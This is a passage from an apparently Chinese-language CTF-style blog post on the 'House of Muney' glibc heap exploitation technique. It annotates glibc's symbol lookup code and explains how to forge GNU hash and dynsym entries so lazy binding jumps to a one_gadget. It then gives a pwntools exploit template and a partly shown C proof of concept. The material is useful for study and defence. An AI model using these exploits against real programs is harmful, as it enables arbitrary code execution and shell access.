class="comment">/* When UNDEF_MAP is NULL, which indicates we are called from</span></span><br><span class="line"><span class="comment">               do_lookup_x on relocation against protected data, we skip</span></span><br><span class="line"><span class="comment">               the data definion in the executable from copy reloc.  */</span></span><br><span class="line">            <span class="keyword">if</span> (ELF_RTYPE_CLASS_EXTERN_PROTECTED_DATA</span><br><span class="line">                &amp;&amp; undef_map == <span class="literal">NULL</span> <span class="comment">// undef_map 不为 NULL 所以不进这个 if 判断。</span></span><br><span class="line">                &amp;&amp; <span class="built_in">map</span>-&gt;l_type == lt_executable</span><br><span class="line">                &amp;&amp; type_class == ELF_RTYPE_CLASS_EXTERN_PROTECTED_DATA) &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Hidden and internal symbols are local, ignore them.  */</span></span><br><span class="line">			<span class="comment">// sym-&gt;st_other 既不能等于 STV_HIDDEN(2) 也不能等于 STV_INTERNAL(1) 。</span></span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely (dl_symbol_visibility_binds_local_p(sym)))</span><br><span class="line">                <span class="keyword">goto</span> skip;</span><br><span class="line"></span><br><span class="line">			<span class="comment">// sym-&gt;st_info == STB_GLOBAL(1)</span></span><br><span class="line">            <span class="keyword">switch</span> (ELFW(ST_BIND) (sym-&gt;st_info)) &#123;</span><br><span class="line">				...</span><br><span class="line">                <span class="keyword">case</span> STB_GLOBAL:</span><br><span class="line">                    <span class="comment">/* Global definition.  Just what we need.  */</span></span><br><span class="line">                    result-&gt;s = sym;</span><br><span class="line">                    result-&gt;m = (<span class="keyword">struct</span> link_map *) <span class="built_in">map</span>;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">// 从这里返回 1 表示找到。</span></span><br><span class="line">				...</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        skip:;</span><br><span class="line">    &#125; <span class="keyword">while</span> (++i &lt; n);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* We have not found anything until now.  */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>check_match</code> 函数中需要伪造符号表。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *</span><br><span class="line"><span class="title function_">check_match</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *<span class="type">const</span> undef_name,</span></span><br><span class="line"><span class="params">            <span class="type">const</span> ElfW(Sym) *<span class="type">const</span> ref,</span></span><br><span class="line"><span class="params">            <span class="type">const</span> <span class="keyword">struct</span> r_found_version *<span class="type">const</span> version,</span></span><br><span class="line"><span class="params">            <span class="type">const</span> <span class="type">int</span> flags,</span></span><br><span class="line"><span class="params">            <span class="type">const</span> <span class="type">int</span> type_class,</span></span><br><span class="line"><span class="params">            <span class="type">const</span> ElfW(Sym) *<span class="type">const</span> sym,</span></span><br><span class="line"><span class="params">            <span class="type">const</span> Elf_Symndx symidx,</span></span><br><span class="line"><span class="params">            <span class="type">const</span> <span class="type">char</span> *<span class="type">const</span> strtab,</span></span><br><span class="line"><span class="params">            <span class="type">const</span> <span class="keyword">struct</span> link_map *<span class="type">const</span> <span class="built_in">map</span>,</span></span><br><span class="line"><span class="params">            <span class="type">const</span> ElfW(Sym) **<span class="type">const</span> versioned_sym,</span></span><br><span class="line"><span class="params">            <span class="type">int</span> *<span class="type">const</span> num_versions)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> stt = ELFW(ST_TYPE) (sym-&gt;st_info);</span><br><span class="line">    assert (ELF_RTYPE_CLASS_PLT == <span class="number">1</span>);</span><br><span class="line">	<span class="comment">// 这里要求 sym-&gt;st_value 不为空且 sym-&gt;st_shndx 不等于 SHN_UNDEF(0) 。</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely ((sym-&gt;st_value == <span class="number">0</span> <span class="comment">/* No value.  */</span></span><br><span class="line">                           &amp;&amp; sym-&gt;st_shndx != SHN_ABS</span><br><span class="line">                           &amp;&amp; stt != STT_TLS)</span><br><span class="line">                          || ELF_MACHINE_SYM_NO_MATCH(sym)</span><br><span class="line">                          || (type_class &amp; (sym-&gt;st_shndx == SHN_UNDEF))))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Ignore all but STT_NOTYPE, STT_OBJECT, STT_FUNC,</span></span><br><span class="line"><span class="comment">       STT_COMMON, STT_TLS, and STT_GNU_IFUNC since these are no</span></span><br><span class="line"><span class="comment">       code/data definitions.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALLOWED_STT \</span></span><br><span class="line"><span class="meta">  ((1 &lt;&lt; STT_NOTYPE) | (1 &lt;&lt; STT_OBJECT) | (1 &lt;&lt; STT_FUNC) \</span></span><br><span class="line"><span class="meta">   | (1 &lt;&lt; STT_COMMON) | (1 &lt;&lt; STT_TLS) | (1 &lt;&lt; STT_GNU_IFUNC))</span></span><br><span class="line">    <span class="comment">// sym-&gt;st_info 的低 4 比特必须等于 STT_NOTYPE(0)，STT_OBJECT(1)，STT_FUNC(2)，STT_COMMON(5)，STT_TLS(6)，STT_GNU_IFUNC(10) 中的其中一个。</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (((<span class="number">1</span> &lt;&lt; stt) &amp; ALLOWED_STT) == <span class="number">0</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 这里要求 strtab + sym-&gt;st_name 指向被劫持函数的函数名，因为一般不会覆盖到动态符号字符串表 ( .dynstr) ，因此伪造其指向字符串表中的函数名即可。</span></span><br><span class="line">    <span class="keyword">if</span> (sym != ref &amp;&amp; <span class="built_in">strcmp</span>(strtab + sym-&gt;st_name, undef_name))</span><br><span class="line">        <span class="comment">/* Not the symbol we are looking for.  */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *verstab = <span class="built_in">map</span>-&gt;l_versyms;</span><br><span class="line">    <span class="keyword">if</span> (version != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (verstab == <span class="literal">NULL</span>)) &#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* We can match the version information or use the</span></span><br><span class="line"><span class="comment">               default one if it is not hidden.  */</span></span><br><span class="line">			<span class="comment">// 正常这些检查都能通过，所以直接跳出。</span></span><br><span class="line">            ElfW(Half) ndx = verstab[symidx] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="built_in">map</span>-&gt;l_versions[ndx].hash != version-&gt;hash</span><br><span class="line">                 || <span class="built_in">strcmp</span>(<span class="built_in">map</span>-&gt;l_versions[ndx].name, version-&gt;name))</span><br><span class="line">                &amp;&amp; (version-&gt;hidden || <span class="built_in">map</span>-&gt;l_versions[ndx].hash</span><br><span class="line">                    || (verstab[symidx] &amp; <span class="number">0x8000</span>)))</span><br><span class="line">                <span class="comment">/* It&#x27;s not the version we want.  */</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* There cannot be another entry for this symbol so stop here.  */</span></span><br><span class="line">    <span class="keyword">return</span> sym; <span class="comment">// 正常从这里返回。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>整个过程中用到了 ELF GNU Hash Table（<code>.gnu.hash</code> 节，对应 <code>_DYNAMIC</code> 中的 <code>DT_GNU_HASH</code>） ，ELF Symbol Table（<code>.dynsym</code> 节，对应 <code>_DYNAMIC</code> 中的 <code>DT_SYMTAB</code>）和 ELF String Table （<code>.dynstr</code> 节，对应 <code>_DYNAMIC</code> 中的 <code>DT_SYMTAB</code>）。</p>
<ul>
<li><p>ELF GNU Hash Table：哈希表，根据查找的函数名字符串的哈希值在表中快速查找该函数在符号表中的下标。对于该哈希表，ida 与 <code>elftools</code> 中对于成员名的定义有出入：</p>
<table>
<thead>
<tr>
<th>ida 解析的名称</th>
<th>elftools 解析的名称</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td><code>elf_gnu_hash_nbuckets</code></td>
<td><code>nbuckets</code></td>
<td><code>buckets</code> 中元素的数量。</td>
</tr>
<tr>
<td><code>elf_gnu_hash_nbuckets</code></td>
<td><code>symoffset</code></td>
<td>符号表下标与 <code>bucket</code> 中对应 hash 值的下标</td>
</tr>
<tr>
<td><code>elf_gnu_hash_bitmask_nwords</code></td>
<td><code>bloom_size</code></td>
<td><code>bloom</code> 中元素的数量。</td>
</tr>
<tr>
<td><code>elf_gnu_hash_shift</code></td>
<td><code>bloom_shift</code></td>
<td>检验哈希值是否存在时验证的第二段 6 bit 的起始位置。</td>
</tr>
<tr>
<td><code>elf_gnu_hash_indexes</code></td>
<td><code>bloom</code></td>
<td>类似 bitmap，用来判断哈希值是否在哈希表中存在，结果不一定准确，只是一种剪枝优化。</td>
</tr>
<tr>
<td><code>elf_gnu_hash_bucket</code></td>
<td><code>buckets</code></td>
<td>哈希值模 <code>nbucket</code> 作为下标对应的 <code>buckets</code> 项存放着 <code>chain</code> 中模 <code>nbucket</code> 相同的哈希值中第一个的下标。</td>
</tr>
<tr>
<td><code>elf_gnu_hash_chain</code></td>
<td><code>chain</code></td>
<td>存储着所有符号对应的哈希值，模 <code>nbucket</code> 相同的哈希值存放在一起。</td>
</tr>
</tbody></table>
</li>
<li><p>ELF Symbol Table：<code>Elf64_Sym</code> 结构体数组，记录了符号的一些相关信息。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word	st_name;		<span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_info;		<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_other;		<span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf64_Section	st_shndx;		<span class="comment">/* Section index */</span></span><br><span class="line">  Elf64_Addr	st_value;		<span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf64_Xword	st_size;		<span class="comment">/* Symbol size */</span></span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>st_name</code>：符号名称在字符串表中的偏移量。</li>
<li><code>st_info</code>：符号类型和绑定信息，低 4 比特必须等于 <code>STT_NOTYPE(0)</code>，<code>STT_OBJECT(1)</code>，<code>STT_FUNC(2)</code>，<code>STT_COMMON(5)</code>，<code>STT_TLS(6)</code>，<code>STT_GNU_IFUNC(10)</code> 中的其中一个。</li>
<li><code>st_other</code>：保留字段，通常为 0 。</li>
<li><code>st_shndx</code>：通常为符号所在节的索引。不能为 <code>SHN_UNDEF(0)</code>，因为 <code>SHN_UNDEF</code> 表示该符号未定义但是在该文件中被引用到，即该符号可能定义在其他目标文件中。</li>
<li><code>st_value</code>：符号的在该模块中的 RVA ，<strong>可以被我们伪造为该模块中的某个地址（例如 <code>one_gadget</code>）对应的 RVA 从而劫持程序执行流程。</strong></li>
<li><code>st_size</code>：符号的大小，这里指的是要重定位的 got 表项的大小，即 8 。不过由于该成员在符号查询过程中未被使用因此不伪造该成员也没影响。</li>
</ul>
</li>
<li><p>ELF String Table：符号名称对应的字符串构成的字符串表，需要伪造 <code>Elf64_Sym</code> 中的 <code>st_name</code> 为查询的函数的名称对应字符串与字符串表起始地址的偏移。因为字符串表要被用到因此不能破坏该结构。如果被破坏需要在对应位置伪造字符串。</p>
</li>
</ul>
<p>延迟绑定中查找函数地址的过程（具体过程参考 <code>pwntools</code> 的依赖库 <code>elftools</code> 中的 <code>GNUHashTable</code> 类中的 <code>get_symbol</code> 函数）：</p>
<ul>
<li><p>在 <code>_dl_lookup_symbol_x</code> 函数中，调用 <code>dl_new_hash</code> 函数计算要调用的函数的名称的哈希值。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">uint_fast32_t</span></span><br><span class="line"><span class="title function_">dl_new_hash</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s)</span> &#123;</span><br><span class="line">    <span class="type">uint_fast32_t</span> h = <span class="number">5381</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">char</span> c = *s; c != <span class="string">&#x27;\0&#x27;</span>; c = *++s)</span><br><span class="line">        h = h * <span class="number">33</span> + c;</span><br><span class="line">    <span class="keyword">return</span> h &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">uint_fast32_t</span> new_hash = dl_new_hash(undef_name);</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>在 <code>do_lookup_x</code> 函数中，将 <code>new_hash</code> 除以 <code>__ELF_NATIVE_CLASS(64)</code> 关于 <code>bloom_size</code> 取模的结果作为 <code>bloom</code> 的下标取出对应的 <code>bloom</code> 的值 <code>bitmask_word</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ElfW(Addr) bitmask_word = bitmask[(new_hash / __ELF_NATIVE_CLASS) &amp; <span class="built_in">map</span>-&gt;l_gnu_bitmask_idxbits]; </span><br></pre></td></tr></table></figure></div>
</li>
<li><p>对 <code>bitmask_word</code> 作一个验证，要求 <code>bitmask_word</code> 的第 <code>new_hash % 64</code> 和 <code>(new_hash &gt;&gt; bloom_shift) % 64</code> 位都要置位，这里判断了两段 6 bit 数据提升准确率（如果前面计算下标没有 <code>bloom_size</code> 取模的限制则这里只需判断低 6 bit 即可，而这里判断的两段 6 bit 还会相互影响，总之是玄学优化）。 在伪造时只需要将 <code>bloom</code> 对应位置保留原数据即可。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> hashbit1 = new_hash &amp; (__ELF_NATIVE_CLASS - <span class="number">1</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> hashbit2 = ((new_hash &gt;&gt; <span class="built_in">map</span>-&gt;l_gnu_shift) &amp; (__ELF_NATIVE_CLASS - <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely((bitmask_word &gt;&gt; hashbit1) &amp; (bitmask_word &gt;&gt; hashbit2) &amp; <span class="number">1</span>))</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>将 <code>new_hash</code> 与 <code>nbuckets</code> 取模的结果作为下标取出 <code>buckets</code> 中的对应项 <code>bucket</code> 。位置时保留原数据即可。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Elf32_Word bucket = <span class="built_in">map</span>-&gt;l_gnu_buckets[new_hash % <span class="built_in">map</span>-&gt;l_nbuckets];</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>如果 <code>bucket</code> 不为空则从 <code>bucket</code> 作为的下标开始向后遍历 <code>chain</code> 直到 <code>chain[bucket]</code> 与 <code>new_hash</code> 除最低位外相同时计算符号表下标为 <code>bucket - symoffset</code> 。如果找到则调用 <code>check_match</code> 查询符号表得到目标函数的 RVA 。伪造时只需在 <code>chain[bucket]</code> 上伪造 <code>new_hash</code> 即可。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (bucket != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="type">const</span> Elf32_Word *hasharr = &amp;<span class="built_in">map</span>-&gt;l_gnu_chain_zero[bucket];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">        <span class="title function_">if</span> <span class="params">(((*hasharr ^ new_hash) &gt;&gt; <span class="number">1</span>) == <span class="number">0</span>)</span> &#123;</span><br><span class="line">            symidx = ELF_MACHINE_HASH_SYMIDX(<span class="built_in">map</span>, hasharr);</span><br><span class="line">            sym = check_match(undef_name, ref, version, flags,</span><br><span class="line">                              type_class, &amp;symtab[symidx], symidx,</span><br><span class="line">                              strtab, <span class="built_in">map</span>, &amp;versioned_sym,</span><br><span class="line">                              &amp;num_versions);</span><br><span class="line">            <span class="keyword">if</span> (sym != <span class="literal">NULL</span>)</span><br><span class="line">                <span class="keyword">goto</span> found_it;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">while</span> ((*hasharr++ &amp; <span class="number">1u</span>) == <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>模板：</p>
</li>
</ul>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">add_chunk(<span class="number">0</span>, <span class="number">0x40000</span> - <span class="number">0x2000</span>)</span><br><span class="line"></span><br><span class="line">edit_chunk(<span class="number">0</span>, n64(-<span class="number">8</span>), p64(<span class="number">0x41002</span> + <span class="number">0x5000</span> + <span class="number">0x4000</span>))</span><br><span class="line"></span><br><span class="line">delete_chunk(<span class="number">0</span>)</span><br><span class="line">add_chunk(<span class="number">0</span>, <span class="number">0x41000</span> * <span class="number">2</span> + <span class="number">0x4000</span>)</span><br><span class="line"></span><br><span class="line">base_off = <span class="number">0x7dff0</span></span><br><span class="line">one_gadget = [<span class="number">0xcbd71</span>, <span class="number">0xcbd74</span>, <span class="number">0xcbd77</span>][<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">gnu_hash_section = libc.get_section_by_name(<span class="string">&#x27;.gnu.hash&#x27;</span>)</span><br><span class="line">dynsym_section = libc.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>)</span><br><span class="line">dynstr_section = libc.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>)</span><br><span class="line"></span><br><span class="line">namehash = gnu_hash_section.gnu_hash(<span class="string">&#x27;exit&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bloom_off = gnu_hash_section[<span class="string">&#x27;sh_addr&#x27;</span>] + <span class="number">4</span> * gnu_hash_section._wordsize</span><br><span class="line">bucket_off = bloom_off + gnu_hash_section.params[<span class="string">&#x27;bloom_size&#x27;</span>] * gnu_hash_section._xwordsize</span><br><span class="line"></span><br><span class="line">bloom_elem_idx = (namehash / gnu_hash_section.elffile.elfclass) % gnu_hash_section.params[<span class="string">&#x27;bloom_size&#x27;</span>]</span><br><span class="line">bloom_elem_off = bloom_off + gnu_hash_section._xwordsize * bloom_elem_idx</span><br><span class="line">bloom_elem_val = gnu_hash_section.params[<span class="string">&#x27;bloom&#x27;</span>][bloom_elem_idx]</span><br><span class="line"></span><br><span class="line">bucket_elem_idx = namehash % gnu_hash_section.params[<span class="string">&#x27;nbuckets&#x27;</span>]</span><br><span class="line">bucket_elem_off = bucket_off + bucket_elem_idx * gnu_hash_section._wordsize</span><br><span class="line">bucket_elem_val = gnu_hash_section.params[<span class="string">&#x27;buckets&#x27;</span>][bucket_elem_idx]</span><br><span class="line"></span><br><span class="line">hasharr_off = gnu_hash_section._chain_pos + (bucket_elem_val - gnu_hash_section.params[<span class="string">&#x27;symoffset&#x27;</span>]) * gnu_hash_section._wordsize</span><br><span class="line"></span><br><span class="line">sym_off = dynsym_section[<span class="string">&#x27;sh_offset&#x27;</span>] + bucket_elem_val * dynsym_section[<span class="string">&#x27;sh_entsize&#x27;</span>]</span><br><span class="line"></span><br><span class="line">sym_value = <span class="string">&#x27;&#x27;</span></span><br><span class="line">sym_value += p32(libc.search(<span class="string">&#x27;exit\x00&#x27;</span>).<span class="built_in">next</span>() - dynstr_section[<span class="string">&#x27;sh_offset&#x27;</span>])  <span class="comment"># st_name</span></span><br><span class="line">sym_value += p8(<span class="number">0x12</span>)  <span class="comment"># st_info</span></span><br><span class="line">sym_value += p8(<span class="number">0</span>)  <span class="comment"># st_other</span></span><br><span class="line">sym_value += p16(<span class="number">1</span>)  <span class="comment"># st_shndx</span></span><br><span class="line">sym_value += p64(one_gadget)  <span class="comment"># st_value</span></span><br><span class="line">sym_value += p8(<span class="number">8</span>)  <span class="comment"># st_size</span></span><br><span class="line"></span><br><span class="line">edit_chunk(<span class="number">0</span>, base_off + bloom_elem_off, p64(bloom_elem_val))</span><br><span class="line">edit_chunk(<span class="number">0</span>, base_off + bucket_elem_off, p32(bucket_elem_val))</span><br><span class="line">edit_chunk(<span class="number">0</span>, base_off + hasharr_off, p64(namehash))</span><br><span class="line">edit_chunk(<span class="number">0</span>, base_off + sym_off, sym_value)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p, &quot;b do_lookup_x\nc&quot;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice:&quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>

<p><a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_muney" >poc<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc 1.c -o 1 -g  -Wl,-z,lazy</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">char</span> *strptr = mmap((<span class="type">void</span> *) <span class="number">0xdeadb000</span>, <span class="number">0x1000</span>, <span class="number">6</span>, <span class="number">0x22</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(strptr, <span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] step1: allocate a chunk ---&gt; void* ptr = malloc(0x40000);&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> *ptr = (<span class="type">size_t</span> *) <span class="built_in">malloc</span>(<span class="number">0x40000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> sz = ptr[<span class="number">-1</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] ptr address: %p, chunk size: %p\n&quot;</span>, ptr, (<span class="type">void</span> *) sz);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] step2: change the size of the chunk ---&gt; ptr[-1] += 0x5000 + 0x4000;&quot;</span>);</span><br><span class="line">    ptr[<span class="number">-1</span>] += <span class="number">0x5000</span> + <span class="number">0x4000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] step3: free ptr and steal heap from glibc ---&gt; free(ptr);&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] step4: retrieve heap ---&gt; ptr = malloc(0x41000 * 2+  0x4000);&quot;</span>);</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">0x41000</span> * <span class="number">2</span> + <span class="number">0x4000</span>);</span><br><span class="line"></span><br><span class="line">    sz = ptr[<span class="number">-1</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] ptr address: %p, chunk size: %p\n&quot;</span>, ptr, (<span class="type">void</span> *) sz);</span><br><span 